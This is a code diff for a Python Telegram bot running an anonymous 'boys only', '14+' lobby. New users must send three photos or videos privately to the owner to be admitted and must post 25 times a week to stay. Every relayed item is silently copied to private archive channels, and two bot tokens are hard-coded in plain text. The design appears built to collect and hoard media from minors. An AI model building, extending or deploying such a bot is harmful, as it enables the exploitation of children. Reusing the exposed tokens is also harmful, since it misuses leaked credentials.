@@ -1,265 +1,684 @@
-from aiogram import Bot, Dispatcher, F
-from aiogram.filters import Command
-from aiogram.types import Message
 import asyncio
-import aiosqlite
 
-BOT_TOKEN = "8734604709:AAEyxy0wnIcl3zQVd2vuzlMzZZCheU1OeUc"
-OWNER_ID = 8755001668
+from aiogram import Bot, Dispatcher, F
+from aiogram.types import (
+    Message,
+    InlineKeyboardMarkup,
+    InlineKeyboardButton,
+    CallbackQuery
+)
+
+BOT_TOKEN = "8681175277:AAEzED0cpESVc0d9Cw5qcZyO_aO3slnDmH8"
+
+OWNER_ID = 8680643227
+
+MAX_USERS = 1000
+
+CHANNELS = [
+    -1003294367677,
+    -1003954730429,
+    -1003953879073,
+    -1003750715678
+]
+
+current_channel = 0
+channel_counter = 0
+
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
 
-waiting_alias = set()
+users = {}
+pending_users = {}
+banned_users = {}
+user_stats = {}
 
-# ================= DATABASE =================
+waiting_name = set()
 
-async def init_db():
-    async with aiosqlite.connect("bmg.db") as db:
-        await db.execute("""
-        CREATE TABLE IF NOT EXISTS users (
-            user_id INTEGER PRIMARY KEY,
-            alias TEXT
-        )
-        """)
-        await db.commit()
+
+# ================= ARCHIVE =================
+
+async def send_to_archive(file_type, file_id, caption=None):
+
+    global current_channel
+    global channel_counter
+
+    channel_id = CHANNELS[current_channel]
+
+    try:
+
+        if file_type == "photo":
+
+            await bot.send_photo(
+                channel_id,
+                file_id,
+                caption=caption
+            )
+
+        elif file_type == "video":
+
+            await bot.send_video(
+                channel_id,
+                file_id,
+                caption=caption
+            )
+
+        elif file_type == "document":
+
+            await bot.send_document(
+                channel_id,
+                file_id,
+                caption=caption
+            )
+
+        channel_counter += 1
+
+        if channel_counter >= 100:
+
+            channel_counter = 0
+
+            current_channel += 1
+
+            if current_channel >= len(CHANNELS):
+
+                current_channel = 0
+
+    except Exception as e:
+
+        print(e)
+
 
 # ================= START =================
 
-@dp.message(Command("start"))
-async def start_command(message: Message):
+@dp.message(F.text == "/start")
+async def start(message: Message):
 
     user_id = message.from_user.id
 
-    async with aiosqlite.connect("bmg.db") as db:
-        cursor = await db.execute(
-            "SELECT alias FROM users WHERE user_id = ?",
-            (user_id,)
-        )
-        user = await cursor.fetchone()
+    # banned
+    if user_id in banned_users:
 
-    if user:
         await message.answer(
-            f"✅ Welcome back!\n\nYour alias: 🔰 {user[0]}"
+            f"⛔ You are banned\nReason: {banned_users[user_id]}"
         )
+
         return
+
+    # pending
+    if user_id in pending_users:
+
+        await message.answer(
+            """⏳ Awaiting Approval
+
+Your submission is still pending admin review.
+You'll be notified once they approve or reject your submission."""
+        )
+
+        return
+
+    # approved
+    if user_id in users:
+
+        await message.answer(
+            "✅ You are already approved."
+        )
+
+        return
+
+    waiting_name.add(user_id)
 
     rules_text = """
 📜 Lobby Rules
 
 ⭐ ⭐️ 🚨 OMG NEW HUMAN 🚨
 - just spawned in BMG!!
+
 PLEASE ENSURE ALL SUBMISSIONS ARE 14+
+
 Say hi or we assume you’re a potato 🥔
 
-Also u might wanna read rules. We assume u can read ofc 🤭😬😭🥀
+━━━━━━━━━━━━━━
 
 1A - Strictly OVER 14 and BOYS only
-1B - IF U dont post minimum 3 times in 7 days you will be banned by the bot.
 
-Welcome to BMG 👋
-
-Yes… you survived the invite. Don’t mess it up.
-
-😂 Basic braincell rules
-
-• Be nice or go touch grass 🌱
-• No fighting — this is a group, not WWE
-• Respect vibes = stay alive
+1B - IF U dont post minimum 25 times in 7 days
+you will be kicked automatically by the bot.
 
 ━━━━━━━━━━━━━━
 
-📷 Media rules
+📷 Media Rules
 
-• Post cool stuff, not spam dumps
-• No weird illegal stuff
-
-━━━━━━━━━━━━━━
-
-💬 Chat energy
-
-• Say hi when you join or lose XP 🎮
-• Drama belongs in reality TV, not here
-• Flirting allowed, being creepy = nope 🚫
+• No illegal content
+• No spam
+• No fake media
+• No girl content
 
 ━━━━━━━━━━━━━━
 
 ⚠️ Admin powers
 
 Mods can:
-• bonk 🪄
-• mute 🤐
-• yeet 🚀
-
-⛔️ THIS IS A BOY ONLY GROUP.
-IF YOU SEND IMAGES OF GIRLS YOU WILL BE PERMANENTLY BANNED.
-
-Violations may result in warnings, kicks, or bans.
+• mute
+• warn
+• kick
+• ban
 """
 
     welcome_text = """
 🎭 Welcome to BMG 2026!
 
-This is an anonymous lobby where you chat with others using an alias.
+This is an anonymous lobby.
 
-Getting Started:
-1️⃣ Choose an alias (display name)
-2️⃣ 📸 Send 3 media items within 30 minutes for approval
-3️⃣ ⏳ Wait for admin approval to start chatting
-4️⃣ Send 3 media items per week to stay active
+1️⃣ Choose alias
+2️⃣ Send 3 media
+3️⃣ Wait approval
 
-Please choose your alias:
-• 3-24 characters
-• Must include at least one letter or number
-• Can include emoji and spaces
-• Must be unique
-
-Send your desired alias now:
+Send your alias now:
 """
 
     await message.answer(rules_text)
     await message.answer(welcome_text)
 
-    waiting_alias.add(user_id)
 
-# ================= HELP =================
+# ================= RECEIVE =================
 
-@dp.message(Command("help"))
-async def help_command(message: Message):
-
-    text = """
-📚 BMG 2026 Help
-
-💬 HOW IT WORKS
-• Messages are relayed anonymously to all members
-• Your alias and rank emoji are shown instead of your name
-• Rank-based quotas and perks reward active members
-
-━━━━━━━━━━━━━━
-
-⚡ Basic Commands
-
-/start - Start or restart the bot
-/help - Show this help menu
-/stats - View your statistics and rank
-/perks - View all rank tiers and benefits
-/leaderboard - View top contributors
-/alias - Change your display name
-/version - Show bot version
-/test - Check connection status
-
-━━━━━━━━━━━━━━
-
-👥 Social Commands
-
-/block <alias> - Block/unblock a user
-/flag [reason] - Report content
-
-━━━━━━━━━━━━━━
-
-🏆 Rank System
-
-12 Rank Tiers:
-🟩 Newcomer → 🥉 Bronze → 🥈 Silver
-🥇 Gold → 🏆 Platinum → 💎 Diamond
-👑 Master → ⭐ Legend → 🌟 Mythic
-
-━━━━━━━━━━━━━━
-
-📜 Info Commands
-
-/rules - View lobby rules
-/welcome - View welcome message
-/leave - Leave the lobby
-
-━━━━━━━━━━━━━━
-
-📦 Archive Commands
-
-/archive - Browse archives
-/purchases - View purchases
-
-━━━━━━━━━━━━━━
-
-🧵 Topics
-
-/blocktopic - Mute/unmute topic
-/resynctopics - Recreate topics
-
-━━━━━━━━━━━━━━
-
-⚠️ This is a BOYS ONLY lobby.
-"""
-
-    await message.answer(text)
-
-# ================= SAVE ALIAS =================
-
-@dp.message()
-async def save_alias(message: Message):
+@dp.message(~F.text.startswith("/"))
+async def all_messages(message: Message):
 
     user_id = message.from_user.id
+    # ================= DELETE LINKS =================
 
-    if user_id not in waiting_alias:
-        return
+    if message.text:
 
-    alias = message.text.strip()
+        # allow owner
+        if message.from_user.id != OWNER_ID:
 
-    if len(alias) < 3 or len(alias) > 24:
+            text = message.text.lower()
+
+            links = [
+                "http",
+                "https",
+                "t.me",
+                "telegram.me",
+                ".com",
+                ".net",
+                ".org",
+                "www."
+            ]
+
+            for link in links:
+
+                if link in text:
+
+                    try:
+                        await message.delete()
+                    except:
+                        pass
+
+                    await message.answer(
+                        "🚫 Links are not allowed."
+                    )
+
+                    return
+    # banned
+    if user_id in banned_users:
+
         await message.answer(
-            "❌ Alias must be between 3 and 24 characters."
+            f"⛔ You are banned\nReason: {banned_users[user_id]}"
         )
+
         return
 
-    async with aiosqlite.connect("bmg.db") as db:
+    # ================= SAVE ALIAS =================
 
-        cursor = await db.execute(
-            "SELECT alias FROM users WHERE alias = ?",
-            (alias,)
+    if user_id in waiting_name:
+
+        nickname = message.text
+
+        pending_users[user_id] = {
+            "alias": nickname,
+            "media": 0
+        }
+
+        waiting_name.remove(user_id)
+
+        await message.answer(
+            f"""✅ Alias Set!
+
+Your alias: 🔰 {nickname}
+
+📸 Send 3 media items."""
         )
 
-        existing = await cursor.fetchone()
+        return
 
-        if existing:
-            await message.answer(
-                "❌ This alias is already taken."
-            )
+    # ================= APPROVAL MEDIA =================
+
+    if user_id in pending_users:
+
+        if not (
+            message.photo or
+            message.video or
+            message.document
+        ):
             return
 
-        await db.execute(
-            "INSERT OR REPLACE INTO users (user_id, alias) VALUES (?, ?)",
-            (user_id, alias)
+        try:
+            await message.delete()
+        except:
+            pass
+
+        pending_users[user_id]["media"] += 1
+
+        count = pending_users[user_id]["media"]
+
+        nickname = pending_users[user_id]["alias"]
+
+        caption = (
+            f"📥 New Submission\n\n"
+            f"👤 Alias: {nickname}\n"
+            f"🆔 ID: {user_id}\n"
+            f"📸 Progress: {count}/3"
         )
 
-        await db.commit()
+        # photo
+        if message.photo:
 
-    waiting_alias.remove(user_id)
+            await bot.send_photo(
+                OWNER_ID,
+                message.photo[-1].file_id,
+                caption=caption
+            )
 
-    success_text = f"""
-✅ Alias Set!
+        # video
+        elif message.video:
 
-Your alias: 🔰 {alias}
+            await bot.send_video(
+                OWNER_ID,
+                message.video.file_id,
+                caption=caption
+            )
 
-Next Steps:
-📸 Send 3 media items within the next 30 minutes to fully join the lobby.
+        # document
+        elif message.document:
 
-Media can be:
-Photos 🖼️
-Videos 🎥
-Documents 📄
-Audio 🎵
-Voice 🎤
-Animations 🎞️
+            await bot.send_document(
+                OWNER_ID,
+                message.document.file_id,
+                caption=caption
+            )
 
-Type /help for more information!
-"""
+        await message.answer(
+            f"📸 Submission Progress: {count}/3"
+        )
 
-    await message.answer(success_text)
+        # finish
+        if count >= 3:
 
+            keyboard = InlineKeyboardMarkup(
+                inline_keyboard=[
+                    [
+                        InlineKeyboardButton(
+                            text="✅ Accept",
+                            callback_data=f"accept_{user_id}"
+                        ),
+
+                        InlineKeyboardButton(
+                            text="❌ Reject",
+                            callback_data=f"reject_{user_id}"
+                        )
+                    ]
+                ]
+            )
+
+            await bot.send_message(
+                OWNER_ID,
+                f"📥 Approval Request\n\n"
+                f"👤 Alias: {nickname}\n"
+                f"🆔 ID: {user_id}",
+                reply_markup=keyboard
+            )
+
+            await message.answer(
+                """⏳ Awaiting Approval
+
+Your submission is still pending admin review."""
+            )
+
+        return
+
+    # ================= NOT APPROVED =================
+
+    if user_id not in users:
+
+        await message.answer(
+            "⏳ You are not approved yet."
+        )
+
+        return
+
+    # ================= DELETE ORIGINAL =================
+
+    try:
+        await message.delete()
+    except:
+        pass
+
+    nickname = users[user_id]
+    
+     # ================= RELAY =================
+
+    for uid in users:
+
+        try:
+
+            # ================= TEXT =================
+
+            if message.text:
+
+                if user_id in user_stats:
+
+                    user_stats[user_id]["messages"] += 1
+
+                await bot.send_message(
+                    uid,
+                    f"👤 {nickname}\n\n📩 {message.text}"
+                )
+
+            # ================= PHOTO =================
+
+            elif message.photo:
+
+                if user_id in user_stats:
+
+                    user_stats[user_id]["photos"] += 1
+
+                await send_to_archive(
+                    "photo",
+                    message.photo[-1].file_id,
+                    f"👤 {nickname}"
+                )
+
+                await bot.send_photo(
+                    uid,
+                    message.photo[-1].file_id,
+                    caption=f"👤 {nickname}"
+                )
+
+            # ================= VIDEO =================
+
+            elif message.video:
+
+                if user_id in user_stats:
+
+                    user_stats[user_id]["videos"] += 1
+
+                await send_to_archive(
+                    "video",
+                    message.video.file_id,
+                    f"👤 {nickname}"
+                )
+
+                await bot.send_video(
+                    uid,
+                    message.video.file_id,
+                    caption=f"👤 {nickname}"
+                )
+
+            # ================= DOCUMENT =================
+
+            elif message.document:
+
+                if user_id in user_stats:
+
+                    user_stats[user_id]["documents"] += 1
+
+                await send_to_archive(
+                    "document",
+                    message.document.file_id,
+                    f"👤 {nickname}"
+                )
+
+                await bot.send_document(
+                    uid,
+                    message.document.file_id,
+                    caption=f"👤 {nickname}"
+                )
+
+        except:
+            pass
+
+# ================= ACCEPT / REJECT =================
+
+@dp.callback_query()
+async def callbacks(call: CallbackQuery):
+
+    if call.from_user.id != OWNER_ID:
+        return
+
+    data = call.data
+
+    # accept
+    if data.startswith("accept_"):
+
+        user_id = int(data.split("_")[1])
+
+        nickname = pending_users[user_id]["alias"]
+
+        if len(users) >= MAX_USERS:
+
+            await bot.send_message(
+                user_id,
+                "⛔ Lobby is full."
+            )
+
+            return
+
+        users[user_id] = nickname
+        user_stats[user_id] = {
+    "messages": 0,
+    "photos": 0,
+    "videos": 0,
+    "documents": 0,
+    "warns": 0
+}
+
+        del pending_users[user_id]
+
+        await bot.send_message(
+            user_id,
+            "✅ Your request has been approved."
+        )
+
+        await call.message.edit_text(
+            f"✅ Accepted {nickname}"
+        )
+
+    # reject
+    elif data.startswith("reject_"):
+
+        user_id = int(data.split("_")[1])
+
+        nickname = pending_users[user_id]["alias"]
+
+        del pending_users[user_id]
+
+        await bot.send_message(
+            user_id,
+            "❌ Your request has been rejected."
+        )
+
+        await call.message.edit_text(
+            f"❌ Rejected {nickname}"
+        )
+
+
+# ================= BAN =================
+
+@dp.message(F.text.startswith("/ban"))
+async def ban_user(message: Message):
+
+    if message.from_user.id != OWNER_ID:
+        return
+
+    try:
+
+        text = message.text.split()
+
+        user_id = int(text[1])
+
+        reason = " ".join(text[2:])
+
+        banned_users[user_id] = reason
+
+        if user_id in users:
+            del users[user_id]
+
+        await message.answer(
+            "✅ User banned."
+        )
+
+        await bot.send_message(
+            user_id,
+            f"⛔ You are banned\nReason: {reason}"
+        )
+
+    except:
+
+        await message.answer(
+            "Usage:\n/ban id reason"
+        )
+
+
+# ================= KICK =================
+
+@dp.message(F.text.startswith("/kick"))
+async def kick(message: Message):
+
+    if message.from_user.id != OWNER_ID:
+        return
+
+    try:
+
+        user_id = int(message.text.split()[1])
+
+        if user_id in users:
+
+            del users[user_id]
+
+            await bot.send_message(
+                user_id,
+                "❌ You have been kicked."
+            )
+
+            await message.answer(
+                "✅ User kicked."
+            )
+
+    except:
+
+        await message.answer(
+            "Usage:\n/kick id"
+        )
+
+
+# ================= MEMBERS =================
+
+@dp.message(F.text == "/members")
+async def members(message: Message):
+
+    if message.from_user.id != OWNER_ID:
+        return
+
+    await message.answer(
+        f"👥 Members: {len(users)}"
+    )
+
+    # ================= DELETE LINKS =================
+
+    if message.text:
+
+        # allow owner
+        if message.from_user.id != OWNER_ID:
+
+            text = message.text.lower()
+
+            links = [
+                "http",
+                "https",
+                "t.me",
+                "telegram.me",
+                ".com",
+                ".net",
+                ".org",
+                "www."
+            ]
+
+            for link in links:
+
+                if link in text:
+
+                    try:
+                        await message.delete()
+                    except:
+                        pass
+
+                    await message.answer(
+                        "🚫 Links are not allowed."
+                    )
+
+                    return
+        # ================= PANEL =================
+
+@dp.message(F.text == "/panel")
+async def panel(message: Message):
+
+    if message.from_user.id != OWNER_ID:
+        return
+
+    if not users:
+
+        await message.answer(
+            "❌ No members."
+        )
+
+        return
+
+    text = "👥 MEMBERS PANEL\n\n"
+
+    for uid, nickname in users.items():
+
+        stats = user_stats.get(uid, {})
+
+        photos = stats.get("photos", 0)
+        videos = stats.get("videos", 0)
+        documents = stats.get("documents", 0)
+        messages = stats.get("messages", 0)
+        warns = stats.get("warns", 0)
+
+        total_media = photos + videos + documents
+
+        status = "🔴"
+
+        if total_media > 0:
+            status = "🟢"
+
+        text += (
+            f"{status} {nickname}\n"
+            f"🆔 {uid}\n"
+            f"📩 {messages}\n"
+            f"🖼 {photos}\n"
+            f"🎥 {videos}\n"
+            f"📄 {documents}\n"
+            f"⚠️ {warns}\n\n"
+        )
+
+    await message.answer(text)
 # ================= MAIN =================
 
 async def main():
-    await init_db()
+
+    print("✅ BMG BOT STARTED")
+
     await dp.start_polling(bot)
 
-if __name__ == "__main__":
-    asyncio.run(main())
+asyncio.run(main())
